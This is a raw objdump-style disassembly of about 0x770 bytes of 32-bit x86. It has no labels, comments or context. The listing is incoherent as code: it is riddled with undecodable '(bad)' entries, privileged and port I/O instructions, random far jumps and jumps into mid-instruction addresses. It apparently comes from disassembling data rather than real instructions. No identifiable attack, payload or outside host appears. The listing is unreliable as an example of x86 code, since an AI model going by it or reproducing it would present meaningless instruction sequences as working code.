  41ba96:	mov    eax,ds:0x9669e272
  41ba9b:	and    bl,al
  41ba9d:	adc    al,0x47
  41ba9f:	push   eax
  41baa0:	(bad)  
  41baa2:	adc    eax,0x6f95be41
  41baa7:	and    ch,BYTE PTR ds:0x87cea9df
  41baad:	ret    0xef14
  41bab0:	or     al,0x12
  41bab2:	pop    ebp
  41bab3:	adc    al,0xbd
  41bab5:	push   esi
  41bab6:	aaa    
  41bab7:	mov    ds:0xfdda8b3b,eax
  41babc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41babd:	and    DWORD PTR [eax+0x58],0xffffff91
  41bac1:	fist   DWORD PTR [ecx+0x31]
  41bac4:	lods   eax,DWORD PTR ds:[esi]
  41bac5:	loop   0x41bb0a
  41bac7:	or     al,0xe9
  41bac9:	js     0x41bae1
  41bacb:	xchg   esp,eax
  41bacc:	or     DWORD PTR [edx+ebx*8+0x4f],0xfc229f57
  41bad4:	xchg   BYTE PTR [esi-0x61],bl
  41bad7:	xor    eax,0xe192e8e6
  41badc:	xor    eax,0xd872c814
  41bae1:	ins    BYTE PTR es:[edi],dx
  41bae2:	xlat   BYTE PTR ds:[ebx]
  41bae3:	iret   
  41bae4:	add    eax,0x36f1cab1
  41bae9:	add    al,bh
  41baeb:	inc    esi
  41baec:	mov    esi,0x8cc75f15
  41baf1:	or     eax,0x810219fc
  41baf6:	adc    eax,0x5c96f5ab
  41bafb:	push   ds
  41bafc:	aam    0x1f
  41bafe:	je     0x41badd
  41bb00:	(bad)  
  41bb01:	hlt    
  41bb02:	xchg   ecx,eax
  41bb03:	add    ah,0xbc
  41bb06:	retf   
  41bb07:	(bad)  
  41bb08:	ret    
  41bb09:	or     edx,DWORD PTR [esp+ecx*4]
  41bb0c:	jbe    0x41bb1a
  41bb0e:	into   
  41bb0f:	cmp    DWORD PTR [esi],edi
  41bb11:	popa   
  41bb12:	or     BYTE PTR [eax+eax*1],0x79
  41bb16:	mov    bh,0x46
  41bb18:	call   FWORD PTR [edi+edi*2+0x47907bbe]
  41bb1f:	mov    dl,0x5e
  41bb21:	pusha  
  41bb22:	add    edi,eax
  41bb24:	adc    BYTE PTR [esp+eiz*2],ah
  41bb27:	add    DWORD PTR [esi-0x3b],ecx
  41bb2a:	xchg   ecx,eax
  41bb2b:	stos   DWORD PTR es:[edi],eax
  41bb2c:	stos   DWORD PTR es:[edi],eax
  41bb2d:	add    BYTE PTR [eax+edi*4],bh
  41bb30:	mov    al,0x82
  41bb32:	push   ss
  41bb33:	jl     0x41bb5f
  41bb35:	outs   dx,BYTE PTR ds:[esi]
  41bb36:	mov    eax,0x5b80affd
  41bb3b:	inc    esi
  41bb3c:	or     BYTE PTR [ebp+0x1d],al
  41bb3f:	jno    0x41bbb5
  41bb41:	push   eax
  41bb42:	pusha  
  41bb43:	rcr    DWORD PTR [ecx+0x4d393e90],cl
  41bb49:	lds    esp,FWORD PTR [ebx+0x3f658020]
  41bb4f:	stos   DWORD PTR es:[edi],eax
  41bb50:	sti    
  41bb51:	gs sub al,0x78
  41bb54:	lods   al,BYTE PTR ds:[esi]
  41bb55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb56:	sbb    eax,0xd46cddf7
  41bb5b:	ret    
  41bb5c:	shl    cl,cl
  41bb5e:	push   0x22
  41bb60:	add    eax,0xcc1f89b1
  41bb65:	cmc    
  41bb66:	(bad)  
  41bb67:	adc    eax,0x633aef87
  41bb6c:	cmp    BYTE PTR [esi-0x78],ch
  41bb6f:	jmp    0x41bb63
  41bb71:	rcr    BYTE PTR [esi+0x18c09842],cl
  41bb77:	mov    ebx,0x8906b3ea
  41bb7c:	pop    ss
  41bb7d:	js     0x41bb00
  41bb7f:	test   BYTE PTR [edx],cl
  41bb81:	in     al,0xbc
  41bb83:	aad    0xe8
  41bb85:	je     0x41bbea
  41bb87:	test   DWORD PTR [esi-0x42],esp
  41bb8a:	push   0xffffffaf
  41bb8c:	stos   DWORD PTR es:[edi],eax
  41bb8d:	sub    ch,bl
  41bb8f:	dec    BYTE PTR [edi+0x3dec9b26]
  41bb95:	sbb    BYTE PTR ds:0x524cb4e7,0x87
  41bb9c:	xor    dl,BYTE PTR [ecx+0x24d791ab]
  41bba2:	dec    esi
  41bba3:	out    dx,al
  41bba4:	add    BYTE PTR [edi-0x5633bbdd],bl
  41bbaa:	push   0xcbde62b3
  41bbaf:	pop    ss
  41bbb0:	mov    esp,0xff75c1e3
  41bbb5:	test   al,0x77
  41bbb7:	xor    ah,BYTE PTR [eax+ebx*2]
  41bbba:	mov    edx,0xabeffbaf
  41bbbf:	retf   0xa7d6
  41bbc2:	pushf  
  41bbc3:	shl    DWORD PTR [ebp+eax*4+0x1b],0xaa
  41bbc8:	inc    BYTE PTR [edi-0x4ea387ae]
  41bbce:	rcl    DWORD PTR [edx-0x57],1
  41bbd1:	cs das 
  41bbd3:	fild   DWORD PTR [ecx-0x136821aa]
  41bbd9:	push   0x63
  41bbdb:	pop    ebx
  41bbdc:	cli    
  41bbdd:	nop
  41bbde:	push   esi
  41bbdf:	nop
  41bbe0:	dec    cx
  41bbe2:	stc    
  41bbe3:	inc    esp
  41bbe4:	scas   al,BYTE PTR es:[edi]
  41bbe5:	dec    edx
  41bbe6:	fucom  st(1)
  41bbe8:	cdq    
  41bbe9:	neg    DWORD PTR [eax]
  41bbeb:	lea    ecx,[edi-0x6b62a3df]
  41bbf1:	cmp    esi,DWORD PTR ds:0x7c6bbf19
  41bbf7:	lods   al,BYTE PTR ds:[esi]
  41bbf8:	clc    
  41bbf9:	cwde   
  41bbfa:	shr    DWORD PTR ds:0xe2da,cl
  41bbff:	mov    ah,0x2a
  41bc01:	and    BYTE PTR [ebp+ebx*2+0x7b29b4f5],al
  41bc08:	mov    BYTE PTR [ebx],ch
  41bc0a:	mov    esp,0x4fb2c627
  41bc0f:	fsubr  DWORD PTR [edi]
  41bc11:	retf   
  41bc12:	jno    0x41bbd6
  41bc14:	jno    0x41bc11
  41bc16:	inc    ecx
  41bc17:	pop    ebp
  41bc18:	(bad)  
  41bc19:	aad    0x3
  41bc1b:	mov    bh,0x95
  41bc1d:	fadd   QWORD PTR [ecx-0x5394238e]
  41bc23:	adc    eax,0x2129faac
  41bc28:	inc    edi
  41bc29:	sar    DWORD PTR [edi],0x5e
  41bc2c:	xor    edi,DWORD PTR [edi+0x2906a189]
  41bc32:	fwait
  41bc33:	jle    0x41bc78
  41bc35:	mov    edi,0x6b1e59ac
  41bc3a:	and    edi,DWORD PTR [edx]
  41bc3c:	mov    ch,0xd
  41bc3e:	add    cl,BYTE PTR [esi+0x29927281]
  41bc44:	pop    ebp
  41bc45:	retf   
  41bc46:	fwait
  41bc47:	cmp    al,0xb3
  41bc49:	inc    esp
  41bc4a:	xor    ebx,edx
  41bc4c:	repnz xchg ecx,eax
  41bc4e:	add    bl,BYTE PTR [ecx+0x6f]
  41bc51:	scas   eax,DWORD PTR es:[edi]
  41bc52:	inc    ecx
  41bc53:	jnp    0x41bc3d
  41bc55:	xchg   ebx,eax
  41bc56:	cmp    eax,0x4150ca49
  41bc5b:	imul   esp,DWORD PTR [ecx-0x63],0xfffffff0
  41bc5f:	stc    
  41bc60:	pop    ebx
  41bc61:	ss gs das 
  41bc64:	cdq    
  41bc65:	test   DWORD PTR [eax+edi*2+0x48add87d],ebx
  41bc6c:	scas   eax,DWORD PTR es:[edi]
  41bc6d:	sub    al,0x54
  41bc6f:	fst    st(4)
  41bc71:	xchg   esi,eax
  41bc72:	scas   al,BYTE PTR es:[edi]
  41bc73:	fwait
  41bc74:	imul   edi,DWORD PTR [ecx+eiz*8],0x28af5172
  41bc7b:	aad    0xab
  41bc7d:	test   BYTE PTR [esi-0xf],ah
  41bc80:	(bad)  
  41bc81:	fst    st(6)
  41bc83:	sbb    ah,BYTE PTR [ebx+0x28]
  41bc86:	(bad)  
  41bc87:	rol    BYTE PTR [edi-0x691d138a],0xea
  41bc8e:	fadd   DWORD PTR [ebx]
  41bc90:	icebp  
  41bc91:	sbb    al,BYTE PTR [edx+ecx*2]
  41bc94:	addr16 sti 
  41bc96:	dec    ebp
  41bc97:	xlat   BYTE PTR ds:[ebx]
  41bc98:	pop    ax
  41bc9a:	mov    al,BYTE PTR ds:0x7f7c9eb5
  41bca0:	in     eax,dx
  41bca1:	cmp    edi,0x7f80a0a7
  41bca7:	adc    bh,BYTE PTR [esp+ecx*8+0x6081f796]
  41bcae:	mov    esp,0xbe94f690
  41bcb3:	inc    eax
  41bcb4:	lods   eax,DWORD PTR ss:[esi]
  41bcb6:	(bad)  
  41bcb7:	outs   dx,DWORD PTR ds:[esi]
  41bcb8:	mov    ebp,0x6878be4c
  41bcbd:	aas    
  41bcbe:	aad    0xbd
  41bcc0:	mov    ebx,0xad9e72ad
  41bcc5:	sti    
  41bcc6:	sub    DWORD PTR [ebx+0x12303954],esp
  41bccc:	aas    
  41bccd:	(bad)  
  41bcce:	mov    DWORD PTR [edi+0x78],edx
  41bcd1:	je     0x41bd3f
  41bcd3:	outs   dx,DWORD PTR ds:[esi]
  41bcd4:	xor    edi,DWORD PTR [ecx-0x152c4750]
  41bcda:	push   ecx
  41bcdb:	fcom   DWORD PTR gs:[ecx]
  41bcde:	shl    DWORD PTR [edx],1
  41bce0:	cli    
  41bce1:	fbld   TBYTE PTR [esi+0x57cb3a8a]
  41bce7:	in     eax,0x7d
  41bce9:	(bad)  
  41bcea:	sbb    bl,BYTE PTR [edx]
  41bcec:	mov    DWORD PTR [eax+edi*2+0x323644f5],eax
  41bcf3:	sbb    BYTE PTR [eax+ecx*1],al
  41bcf6:	in     al,0xb8
  41bcf8:	or     ebx,DWORD PTR [esi+0x3c]
  41bcfb:	xlat   BYTE PTR ds:[ebx]
  41bcfc:	mov    ah,0xa1
  41bcfe:	out    0x86,eax
  41bd00:	jl     0x41bd25
  41bd02:	in     al,0x77
  41bd04:	ja     0x41bcb0
  41bd06:	xor    DWORD PTR [eax+esi*2],0xffffff98
  41bd0a:	adc    eax,0x4a9ef5c6
  41bd0f:	popf   
  41bd10:	shl    DWORD PTR [edx],cl
  41bd12:	pop    sp
  41bd14:	xchg   ebp,eax
  41bd15:	hlt    
  41bd16:	and    al,0x44
  41bd18:	xor    bh,cl
  41bd1a:	mov    ebx,0x8bfc2948
  41bd1f:	mov    WORD PTR [edx+0x8],?
  41bd22:	icebp  
  41bd23:	mov    dh,BYTE PTR [esi+0x72]
  41bd26:	neg    BYTE PTR [esi]
  41bd28:	push   ss
  41bd29:	mov    eax,0xb4833177
  41bd2e:	inc    edx
  41bd2f:	push   es
  41bd30:	lods   al,BYTE PTR ds:[esi]
  41bd31:	inc    esi
  41bd32:	dec    edi
  41bd33:	push   edx
  41bd34:	mov    WORD PTR [ebx+ebx*8+0x6f60a70d],ss
  41bd3b:	stc    
  41bd3c:	cmp    BYTE PTR [ebp+0x4b],al
  41bd3f:	mov    ecx,0xa41f4b5d
  41bd44:	mov    ds:0xb52ad947,al
  41bd49:	iret   
  41bd4a:	adc    al,0x61
  41bd4c:	jmp    0x18e6:0xd368a4fb
  41bd53:	std    
  41bd54:	cdq    
  41bd55:	pop    ss
  41bd56:	je     0x41bd29
  41bd58:	pusha  
  41bd59:	jbe    0x41bd2b
  41bd5b:	repz xchg esi,eax
  41bd5d:	inc    eax
  41bd5e:	sbb    BYTE PTR [esi+0x4b],bl
  41bd61:	pop    eax
  41bd62:	dec    BYTE PTR [eax+eiz*2+0xca84c1]
  41bd69:	retf   0x1ec4
  41bd6c:	sbb    edx,edi
  41bd6e:	ins    DWORD PTR es:[edi],dx
  41bd6f:	in     eax,dx
  41bd70:	mov    ebx,0x53746fe6
  41bd75:	test   al,0x35
  41bd77:	lea    ebx,[ecx+0x5d]
  41bd7a:	ja     0x41bda4
  41bd7c:	inc    edi
  41bd7d:	shr    BYTE PTR [ecx+0x7112a508],1
  41bd83:	and    BYTE PTR [edx-0x334ee2ea],0xdb
  41bd8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd8b:	adc    BYTE PTR [ebx],cl
  41bd8d:	(bad)  
  41bd8e:	mov    ebp,0x98a3e500
  41bd93:	sub    DWORD PTR [esi+0x2cef5856],ecx
  41bd99:	inc    esi
  41bd9a:	jae    0x41bd86
  41bd9c:	add    BYTE PTR [edx-0x50],al
  41bd9f:	inc    ebx
  41bda0:	ss push edi
  41bda2:	stos   BYTE PTR es:[edi],al
  41bda3:	mov    ebx,0x5f410cdc
  41bda8:	mov    edx,0x4ca32a90
  41bdad:	add    eax,0xe3dd3221
  41bdb2:	enter  0xea2a,0xd0
  41bdb6:	in     al,0x1b
  41bdb8:	xchg   BYTE PTR [ebx],ch
  41bdba:	and    BYTE PTR [edi+0x77],cl
  41bdbd:	inc    ecx
  41bdbe:	dec    ebx
  41bdbf:	test   eax,0x1b0ce3a7
  41bdc4:	aam    0xd8
  41bdc6:	adc    BYTE PTR [esi],bl
  41bdc8:	xchg   edx,eax
  41bdc9:	aam    0x9a
  41bdcb:	mov    dh,0x27
  41bdcd:	in     eax,0xe3
  41bdcf:	xchg   edi,eax
  41bdd0:	es retf 0xb817
  41bdd4:	retf   
  41bdd5:	outs   dx,DWORD PTR ds:[esi]
  41bdd6:	int    0xb2
  41bdd8:	adc    ebx,DWORD PTR ds:0x3512bb8e
  41bdde:	loopne 0x41be1e
  41bde0:	mov    ecx,0x755e8a1a
  41bde5:	push   edi
  41bde6:	rol    DWORD PTR [ecx],1
  41bde8:	sub    DWORD PTR [esi-0x6778bd04],eax
  41bdee:	out    dx,eax
  41bdef:	inc    edx
  41bdf0:	push   ebx
  41bdf1:	xchg   ebx,eax
  41bdf2:	mov    ebp,DWORD PTR [eax]
  41bdf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdf5:	xor    eax,DWORD PTR [ebx-0x3cd667a]
  41bdfb:	cmp    al,0x9e
  41bdfd:	mov    eax,fs:0x9128b242
  41be03:	pusha  
  41be04:	call   0x91b7dfb9
  41be09:	stos   DWORD PTR es:[edi],eax
  41be0a:	ins    DWORD PTR es:[edi],dx
  41be0b:	xor    BYTE PTR [edi],dl
  41be0d:	mov    eax,0x2a13252b
  41be12:	jae    0x41be6f
  41be14:	imul   BYTE PTR [ebp+edi*8+0x10]
  41be18:	and    DWORD PTR [esi+eiz*4+0x60b1e60b],ebx
  41be1f:	add    ebp,DWORD PTR [ecx]
  41be21:	loope  0x41bdd4
  41be23:	add    eax,0xd6aa0c4f
  41be28:	add    ah,BYTE PTR [ecx+ecx*8]
  41be2b:	out    dx,al
  41be2c:	pop    edx
  41be2d:	in     eax,0x7a
  41be2f:	(bad)
  41be33:	jmp    0x3db3e20f
  41be38:	add    DWORD PTR [ebx],eax
  41be3a:	mov    dh,0x4d
  41be3c:	leave  
  41be3d:	popa   
  41be3e:	mov    al,ds:0x798a71b7
  41be43:	sbb    BYTE PTR [eax+0x5717cf52],0x0
  41be4a:	les    esi,FWORD PTR ss:[eax+0x42]
  41be4e:	jne    0x41be97
  41be50:	and    eax,0x70de3d53
  41be55:	jbe    0x41becc
  41be57:	sub    al,0xf3
  41be59:	jmp    0xe562ef9
  41be5e:	mov    dh,cl
  41be60:	ins    DWORD PTR es:[edi],dx
  41be61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be62:	xchg   esp,eax
  41be63:	out    dx,eax
  41be64:	cmc    
  41be65:	ret    
  41be66:	outs   dx,BYTE PTR ds:[esi]
  41be67:	fistp  WORD PTR [esp+ecx*2]
  41be6a:	pusha  
  41be6b:	inc    ebx
  41be6c:	clc    
  41be6d:	add    BYTE PTR [edi],0xdf
  41be70:	sbb    ecx,DWORD PTR [edi]
  41be72:	add    eax,0x4dc93322
  41be77:	jbe    0x41be3b
  41be79:	fimul  WORD PTR [ebp+ebx*1-0x18]
  41be7d:	jo     0x41be4a
  41be7f:	push   eax
  41be80:	je     0x41be39
  41be82:	shr    BYTE PTR [edi+0x512c739],1
  41be88:	lahf   
  41be89:	ret    0x1908
  41be8c:	cwde   
  41be8d:	fmul   QWORD PTR [ebp-0x184b1e6f]
  41be93:	mov    bh,0xfe
  41be95:	adc    esp,DWORD PTR [edx-0x59f287e1]
  41be9b:	cs nop
  41be9d:	sbb    ebp,0x13
  41bea0:	pop    ebx
  41bea1:	jle    0x41be49
  41bea3:	sbb    eax,0x4cb3c472
  41bea8:	xor    bh,BYTE PTR [edx+0x4e]
  41beab:	and    BYTE PTR [edx],0x8f
  41beae:	inc    ebp
  41beaf:	push   es
  41beb0:	dec    edi
  41beb1:	inc    esi
  41beb2:	sar    dh,cl
  41beb4:	push   ss
  41beb5:	lods   al,BYTE PTR ds:[esi]
  41beb6:	jmp    0x882c41e0
  41bebb:	stos   BYTE PTR es:[edi],al
  41bebc:	sub    DWORD PTR [ecx],edx
  41bebe:	mov    esp,0xfc03e2bb
  41bec3:	into   
  41bec4:	mov    ah,0x2d
  41bec6:	add    ebp,edx
  41bec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bec9:	enter  0xe284,0x73
  41becd:	xor    al,0x45
  41becf:	in     eax,0x16
  41bed1:	mov    cs,WORD PTR [edx-0x6cb8ddba]
  41bed7:	sub    bh,BYTE PTR [ecx+0x19]
  41beda:	and    DWORD PTR [ebp+eiz*8-0x264524f4],ebp
  41bee1:	mov    edx,0xf3fc69a6
  41bee6:	mov    edi,DWORD PTR [eax+0x7b0acb48]
  41beec:	rcl    DWORD PTR [esi],1
  41beee:	ret    0x9586
  41bef1:	mov    bh,0x7a
  41bef3:	dec    edi
  41bef4:	pop    esi
  41bef5:	fcomip st,st(5)
  41bef7:	mov    edi,0x6b76def4
  41befc:	das    
  41befd:	out    0xe1,eax
  41beff:	mov    ecx,0xccbee94d
  41bf04:	je     0x41bf82
  41bf06:	cdq    
  41bf07:	test   DWORD PTR [edi],edi
  41bf09:	lds    ecx,FWORD PTR [ebp+0x7f]
  41bf0c:	hlt    
  41bf0d:	repz sahf 
  41bf0f:	(bad)  
  41bf10:	push   ecx
  41bf11:	jg     0x41bf01
  41bf13:	int    0xe2
  41bf15:	test   al,0x23
  41bf17:	fucomip st,st(4)
  41bf19:	(bad)  
  41bf1a:	sub    esi,ebx
  41bf1c:	sahf   
  41bf1d:	enter  0xda36,0x4b
  41bf21:	(bad)  
  41bf22:	mov    ebp,0xa6b5dcda
  41bf27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf28:	and    edx,esi
  41bf2a:	sar    BYTE PTR [ecx],1
  41bf2c:	ss xchg esi,eax
  41bf2e:	icebp  
  41bf2f:	neg    BYTE PTR [ebp+0xf]
  41bf32:	mov    ds:0x27c03ef4,eax
  41bf37:	dec    eax
  41bf38:	push   edi
  41bf39:	cmp    eax,0xbe819094
  41bf3e:	(bad)  
  41bf3f:	cli    
  41bf40:	sbb    al,0xe6
  41bf42:	jae    0x41bfb7
  41bf44:	xor    edx,DWORD PTR ds:0xd1715a9e
  41bf4a:	xchg   ecx,eax
  41bf4b:	push   ds
  41bf4c:	pop    es
  41bf4d:	ret    
  41bf4e:	jne    0x41bfab
  41bf50:	not    edi
  41bf52:	or     dh,BYTE PTR [ebx+0x27]
  41bf55:	jp     0x41bfbb
  41bf57:	jle    0x41bf98
  41bf59:	mov    DWORD PTR [ebx],ebp
  41bf5b:	clc    
  41bf5c:	js     0x41bf97
  41bf5e:	push   ds
  41bf5f:	add    ebp,DWORD PTR [ecx]
  41bf61:	jbe    0x41bf10
  41bf63:	iret   
  41bf64:	xor    cl,dh
  41bf66:	popa   
  41bf67:	fcmovu st,st(0)
  41bf69:	mov    al,dh
  41bf6b:	ret    0x85c7
  41bf6e:	or     al,0xe3
  41bf70:	fadd   DWORD PTR [ebx]
  41bf72:	mov    ds:0x620ecba8,al
  41bf77:	cwde   
  41bf78:	inc    ebp
  41bf79:	je     0x41bf9f
  41bf7b:	and    DWORD PTR [eax-0x33],esi
  41bf7e:	popa   
  41bf7f:	mov    edi,esp
  41bf81:	retf   0xfd9d
  41bf84:	idiv   BYTE PTR [ebp+ebx*2+0x601498fe]
  41bf8b:	jmp    0x41bf8b
  41bf8d:	pop    ecx
  41bf8e:	ror    DWORD PTR [ebp+0x3f02d513],cl
  41bf94:	repz jmp 0x98bf:0x998c3ee4
  41bf9c:	fidiv  WORD PTR [ebx+esi*4-0x429feb49]
  41bfa3:	push   edi
  41bfa4:	push   cs
  41bfa5:	pusha  
  41bfa6:	push   eax
  41bfa7:	and    DWORD PTR [edi-0x4d],eax
  41bfaa:	mov    ch,0x18
  41bfac:	std    
  41bfad:	mov    esi,0x14198c5b
  41bfb2:	pusha  
  41bfb3:	test   al,0x67
  41bfb5:	lds    ecx,FWORD PTR [edi]
  41bfb7:	xor    DWORD PTR [ebx-0x1c8bb5e7],0xf0ef2c5f
  41bfc1:	call   0x4917:0x7b81a367
  41bfc8:	retf   0x6214
  41bfcb:	dec    esp
  41bfcc:	mov    edx,0xba1511ee
  41bfd1:	stc    
  41bfd2:	jno    0x41bfc6
  41bfd4:	minps  xmm0,XMMWORD PTR [esi+0x66]
  41bfd8:	outs   dx,BYTE PTR ds:[esi]
  41bfd9:	iret   
  41bfda:	imul   edi,DWORD PTR [ebx-0x1fdf4fac],0xfffffff7
  41bfe1:	(bad)  
  41bfe2:	cmp    eax,0x9ab467ad
  41bfe7:	sub    eax,DWORD PTR [ecx-0x31d1de8a]
  41bfed:	in     al,0x4b
  41bfef:	icebp  
  41bff0:	cmp    DWORD PTR [esi-0x55],esp
  41bff3:	inc    edi
  41bff4:	push   es
  41bff5:	mov    ?,WORD PTR [edx-0x1b25a730]
  41bffb:	call   0xfac1e546
  41c000:	push   0xffffff83
  41c002:	sbb    esp,DWORD PTR [ebp+0x5d5f1275]
  41c008:	pop    edx
  41c009:	inc    edx
  41c00a:	lea    esp,[ecx+0x28534257]
  41c010:	fcmovnb st,st(1)
  41c012:	mov    ebx,DWORD PTR [ecx]
  41c014:	adc    BYTE PTR [ebp-0x35eb96f8],ch
  41c01a:	ins    BYTE PTR es:[edi],dx
  41c01b:	mov    eax,0x83852f00
  41c020:	out    0xc6,eax
  41c022:	cld    
  41c023:	dec    esi
  41c024:	aas    
  41c025:	mov    bh,0xb7
  41c027:	(bad)  
  41c028:	adc    DWORD PTR es:[eax],eax
  41c02b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c02c:	call   FWORD PTR [edx]
  41c02e:	call   FWORD PTR [ebx-0x1a4b6bc8]
  41c034:	push   ebx
  41c035:	pop    esp
  41c036:	stc    
  41c037:	fidiv  WORD PTR [ebp+0x4c3b3560]
  41c03d:	add    DWORD PTR [edx],ebx
  41c03f:	dec    esp
  41c040:	pminsw mm0,mm2
  41c043:	stos   BYTE PTR es:[edi],al
  41c044:	mov    eax,0xd4ae63cd
  41c049:	js     0x41c05e
  41c04b:	cmp    al,0xdc
  41c04d:	and    eax,0x4f61967a
  41c052:	jp     0x41c049
  41c054:	push   ebx
  41c055:	sub    al,0x74
  41c057:	lock mov edi,0x93b15808
  41c05d:	inc    esp
  41c05e:	cmp    DWORD PTR [eax+edx*2],eax
  41c061:	ds mov ebx,0x6b6c8327
  41c067:	fadd   QWORD PTR [ebp+0x38]
  41c06a:	das    
  41c06b:	das    
  41c06c:	and    DWORD PTR [ebp-0x2d35f3b2],ebp
  41c072:	inc    edi
  41c073:	test   eax,ebx
  41c075:	adc    dl,BYTE PTR [ecx-0x68]
  41c078:	scas   eax,DWORD PTR es:[edi]
  41c079:	fsub   DWORD PTR [edi-0x76]
  41c07c:	cmp    DWORD PTR [edi+0xf],esp
  41c07f:	mov    ds:0x45f126b2,al
  41c084:	jecxz  0x41c05f
  41c086:	cld    
  41c087:	push   0xe46b0a9a
  41c08c:	les    esp,FWORD PTR [eax-0x6b]
  41c08f:	cmp    DWORD PTR [edi-0x19],eax
  41c092:	dec    ecx
  41c093:	dec    ecx
  41c094:	pop    ebx
  41c095:	and    dh,bh
  41c097:	jge    0x41c029
  41c099:	adc    BYTE PTR [edx+eiz*1+0x7ca9d483],dl
  41c0a0:	aam    0xb
  41c0a2:	and    eax,0x6249b35d
  41c0a7:	jle    0x41c088
  41c0a9:	fld    TBYTE PTR [edx]
  41c0ab:	scas   eax,DWORD PTR es:[edi]
  41c0ac:	pop    ebx
  41c0ad:	sub    eax,0xed75820b
  41c0b2:	xor    bl,ah
  41c0b4:	pop    esi
  41c0b5:	and    al,0xa4
  41c0b7:	or     al,0xa8
  41c0b9:	pop    ds
  41c0ba:	or     DWORD PTR [ebx+0x32e18487],eax
  41c0c0:	js     0x41c0bf
  41c0c2:	mov    ebx,0xf6a70839
  41c0c7:	jmp    0x41c05a
  41c0c9:	in     eax,dx
  41c0ca:	add    eax,0x51a663fb
  41c0cf:	adc    BYTE PTR [edi-0x2a],dl
  41c0d2:	stos   DWORD PTR es:[edi],eax
  41c0d3:	iret   
  41c0d4:	or     eax,0x6a7172fd
  41c0d9:	mov    bh,0xe
  41c0db:	jl     0x41c0a5
  41c0dd:	cmp    ecx,DWORD PTR [ecx+0x3c5d597a]
  41c0e3:	adc    DWORD PTR [ebp+0xb5a7195],edi
  41c0e9:	and    ecx,DWORD PTR ds:0xe00da537
  41c0ef:	xchg   edx,eax
  41c0f0:	push   0x6eb805f5
  41c0f5:	jne    0x41c0c7
  41c0f7:	pusha  
  41c0f8:	dec    esp
  41c0f9:	fwait
  41c0fa:	jmp    0x41c080
  41c0fc:	mov    eax,0xf1d757af
  41c101:	pop    esi
  41c102:	outs   dx,DWORD PTR ds:[esi]
  41c103:	xchg   ebp,eax
  41c104:	jnp    0x41c0eb
  41c106:	test   BYTE PTR [ebx-0x348aaf54],ah
  41c10c:	cmp    BYTE PTR [edx-0x60],ah
  41c10f:	test   ax,0xaf13
  41c113:	jmp    0x41c174
  41c115:	loopne 0x41c0ea
  41c117:	mov    edx,0x2252dd66
  41c11c:	xchg   ebx,eax
  41c11d:	out    dx,al
  41c11e:	or     al,0x8b
  41c120:	cwde   
  41c121:	shr    BYTE PTR [ecx+edi*4+0x45],1
  41c125:	sti    
  41c126:	ror    DWORD PTR [esi+0x7c],cl
  41c129:	adc    ch,bh
  41c12b:	cld    
  41c12c:	cmp    eax,DWORD PTR [ebp-0xc54f6b3]
  41c132:	out    dx,al
  41c133:	mov    ebx,edi
  41c135:	push   eax
  41c136:	mov    bl,0x79
  41c138:	retf   0x4b53
  41c13b:	test   DWORD PTR [ebx],0x6dbbd841
  41c141:	(bad)  
  41c142:	jmp    0xab3b:0x3c936c48
  41c149:	xor    ah,BYTE PTR [ecx]
  41c14b:	pop    edi
  41c14c:	adc    BYTE PTR [ebx],al
  41c14e:	lods   al,BYTE PTR ds:[esi]
  41c14f:	or     esp,DWORD PTR [edx-0x23]
  41c152:	add    eax,0x1744717e
  41c157:	jmp    0x4206decc
  41c15c:	or     al,0x1b
  41c15e:	jecxz  0x41c165
  41c160:	push   es
  41c161:	out    dx,eax
  41c162:	and    eax,0x29ef75da
  41c167:	pop    eax
  41c168:	sar    DWORD PTR [esi],0xda
  41c16b:	mov    edi,0xbfd6e3d8
  41c170:	call   0xaeda:0x377b6769
  41c177:	dec    DWORD PTR [ebx+0x578aa4dd]
  41c17d:	retf   
  41c17e:	lea    eax,[edx-0x9]
  41c181:	push   ebx
  41c182:	adc    DWORD PTR [edx-0x1e521874],eax
  41c188:	dec    ebp
  41c189:	sbb    BYTE PTR ds:0x90a97663,dl
  41c18f:	scas   al,BYTE PTR es:[edi]
  41c190:	pop    ecx
  41c191:	ins    DWORD PTR es:[edi],dx
  41c192:	mov    DWORD PTR [eax],ebx
  41c194:	clc    
  41c195:	sbb    eax,0xc5abe5d0
  41c19a:	fwait
  41c19b:	stos   BYTE PTR es:[edi],al
  41c19c:	popa   
  41c19d:	addr16 push ds
  41c19f:	mov    ch,0xcf
  41c1a1:	or     BYTE PTR [edi-0x33],bl
  41c1a4:	out    0x54,al
  41c1a6:	pop    esi
  41c1a7:	(bad)  
  41c1a8:	push   ebp
  41c1a9:	mov    ds:0xeeded4dd,eax
  41c1ae:	sar    DWORD PTR cs:[ecx+0x4b721333],1
  41c1b5:	inc    ecx
  41c1b6:	inc    edi
  41c1b7:	mov    al,0x94
  41c1b9:	jns    0x41c1db
  41c1bb:	fistp  QWORD PTR [eax+0x440e2801]
  41c1c1:	fsub   QWORD PTR [ebx-0x4988a500]
  41c1c7:	scas   eax,DWORD PTR es:[edi]
  41c1c8:	pop    eax
  41c1c9:	mov    bl,0x72
  41c1cb:	and    al,0x7b
  41c1cd:	jge    0x41c178
  41c1cf:	xor    al,0x78
  41c1d1:	shr    BYTE PTR [ebx],1
  41c1d3:	loop   0x41c179
  41c1d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1d6:	(bad)  
  41c1d7:	or     al,0x1a
  41c1d9:	repnz add al,0xe
  41c1dc:	cmp    DWORD PTR cs:[edx+edx*1+0x35148a4b],esi
  41c1e4:	sti    
  41c1e5:	xchg   edx,eax
  41c1e6:	test   eax,0x755cd2d6
  41c1eb:	fwait
  41c1ec:	es into 
  41c1ee:	neg    BYTE PTR [edi]
  41c1f0:	pop    ds
  41c1f1:	cmp    BYTE PTR [ecx+0x42e3a2ab],bl
  41c1f7:	dec    eax
  41c1f8:	xchg   edi,eax
  41c1f9:	dec    edx
  41c1fa:	push   cs
  41c1fb:	dec    ebp
  41c1fc:	mov    eax,ds:0xb8d13b8a
  41c201:	jle    0x41c224
  41c203:	rcl    DWORD PTR [eax-0x4af6e97],0x28
  41c20a:	je     0x41c18d
  41c20c:	ins    DWORD PTR es:[edi],dx
